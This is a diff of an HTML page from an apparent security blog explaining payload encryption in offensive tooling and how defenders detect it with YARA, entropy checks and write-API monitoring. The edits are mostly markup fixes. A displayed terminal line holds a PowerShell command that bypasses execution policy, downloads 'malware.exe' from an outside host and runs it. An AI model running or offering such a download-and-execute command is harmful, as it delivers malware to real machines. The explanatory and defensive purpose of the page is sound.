@@ -16,16 +16,16 @@
     <a href="../index.html" class="text-gray-300  hover:underline">← Back to Dashboard</a>
   </header>
 <main id="article" class="p-6 space-y-2">
-  <section class="relative rounded-xl shadow-2xl bg-gray-900 p-10 overflow-hidden">
+  <section class="relative rounded-xl shadow-2xl bg-gray-900 p-10 isolate">
     <div class="absolute -bottom-20 -right-20 w-96 h-96 bg-gradient-to-br from-green-400 to-blue-600 opacity-30 blur-3xl animate-blob animation-delay-2000"></div>
       <div class="relative grid grid-cols-1 lg:grid-cols-2 gap-8 items-center">
         <section class="relative bg-gradient-to-br bg-gray-800 to-gray-800 rounded-2xl shadow-2xl overflow-visible p-6">
           <div class="absolute inset-x-0 top-0 h-1 bg-gradient-to-r from-green-400 via-blue-400 to-purple-400 animate-gradient-x"></div>
-          <code class="bg-gray-800 text-green-300 rounded px-1">PS C:\Users\Administrator> .\Encrypt.exe -c "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri "https://ironhulk.com/malware.exe" -OutFile "$env:TEMP\\Payload.exe\\"; Start-Process -FilePath "$env:TEMP\\Payload.exe\\" -NoNewWindow"</code>
+          <code class="bg-gray-800 text-green-300 rounded px-1">PS C:\Users\Administrator&gt; .\Encrypt.exe -c "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri "https://ironhulk.com/malware.exe" -OutFile "$env:TEMP\\Payload.exe\\"; Start-Process -FilePath "$env:TEMP\\Payload.exe\\" -NoNewWindow"</code>
           <br><br>
           <code class="bg-gray-800 text-green-300 rounded px-1">Encrypted payload: {0xBA, 0xDF, 0x00, 0x0D, 0x0E, 0xE8, 0xF9, 0xA5, 0xDE, 0x46, 0x48, 0x31, 0xAD, 0xBE, 0xEF, 0xCA}</code>
           <br><br>
-          <code class="bg-gray-800 text-green-300 rounded px-1">PS C:\Users\Administrator> </code>
+          <code class="bg-gray-800 text-green-300 rounded px-1">PS C:\Users\Administrator</code>
         </section>
         <div class="relative bg-gray-900 p-8 rounded-2xl shadow-2xl overflow-hidden">
           <div class="absolute -top-10 -left-10 w-48 h-48 bg-gradient-to-tr from-purple-600 to-pink-500 opacity-20 blur-3xl animate-blob"></div>
@@ -33,7 +33,7 @@
           <div class="relative z-10 text-gray-100 space-y-6">
             <h2 class="text-3xl font-extrabold text-white flex items-center">
             <span class="w-1 h-8 bg-indigo-400 mr-4 rounded"></span>
-            What Exactly Is “Payload Encryption”?</span>
+            What Exactly Is “Payload Encryption”?
             </h2>
             <p class="text-base leading-relaxed sm:text-justify">
               In the context of offensive tooling, payload encryption is the practice of transforming an executable, shellcode, configuration block, or 
@@ -97,7 +97,7 @@
       <div class="w-full bg-gray-800 bg-opacity-50 rounded-lg p-6 animate-fadeInUp animation-delay-500">
         <h2 class="text-2xl font-bold text-red-400 mb-1 flex items-center mb-4">
           <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3"></path></svg>
-          Detection and Defensive Considerations</span>
+          Detection and Defensive Considerations
         </h2>
         <p class="text-gray-300 leading-relaxed sm:text-justify pl-1 ">
           Static <span class="text-blue-300 font-mono ">YARA</span> signatures can still flag decryptor stubs like API import patterns for <code class="bg-gray-800 text-green-300 rounded px-1">CryptEncrypt</code>, <code class="bg-gray-800 text-green-300 rounded px-1">VirtualProtect</code>, or self-modifying loops. Memory scanners hunt 
@@ -108,7 +108,7 @@
       <div class="w-full bg-gray-800 bg-opacity-50 rounded-lg p-6 animate-fadeInUp animation-delay-500">
         <h2 class="text-2xl font-bold text-blue-400 mb-1 flex items-center mb-4">
           <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3"></path></svg>
-          Defending Against Security-Side Brute-Force:</span>
+          Defending Against Security-Side Brute-Force:
         </h2>
         <p class="text-gray-300 leading-relaxed sm:text-justify pl-1">
           When a threat-actor ships an encrypted payload, the real battle is no longer whether defenders will capture the ciphertext, sooner or later they will, but whether
@@ -202,7 +202,7 @@
           <ol class="list-decimal list-inside pl-5">
             <li><span class="font-semibold">Slice:</span> Each file into chunks, whole file, per-section (PE headers, .text, .rsrc), or rolling windows of N kB..</li>
             <li><span class="font-semibold">Compute:</span> Measure Shannon entropy for each slice.</li>
-            <li><span class="font-semibold">Compare:</span> Flag slices >7.5 bits/byte (excluding <code class="bg-gray-800 text-green-300 rounded px-1">.text</code>) or feed values into ML models.</li>
+            <li><span class="font-semibold">Compare:</span> Flag slices &gt;7.5 bits/byte (excluding <code class="bg-gray-800 text-green-300 rounded px-1">.text</code>) or feed values into ML models.</li>
           </ol>
           <br>
           <div class="bg-gray-700 bg-opacity-50 p-6 rounded-xl transform hover:scale-105 transition-transform duration-300">
@@ -210,7 +210,7 @@
               Behavioral monitors hook write APIs like 
               <code class="bg-gray-800 text-green-300 rounded px-1">NtWriteFile</code> and 
               <code class="bg-gray-800 text-green-300 rounded px-1">WriteFileEx</code> to catch high-entropy writes in real time. 
-              If a process starts saving >7.6-bit data to many files, writes are blocked—mimicking modern anti-ransomware libraries.
+              If a process starts saving &gt;7.6-bit data to many files, writes are blocked—mimicking modern anti-ransomware libraries.
             </p>
           </div>
         </div>
@@ -627,7 +627,7 @@
         });
       }
     </script>     
-  </section>
+  
   <footer class="flex flex-col items-center justify-center gap-4 py-6 bg-[#0f172a] text-gray-200">
     <p class="text-center">Crafted with passion<br>2025 Iron Hulk — No rights reserved.</p>
     <a href="../index.html" class="inline-block bg-blue-500 text-white text-sm px-4 py-2 rounded hover:bg-blue-600 transition">← Back to Dashboard</a>
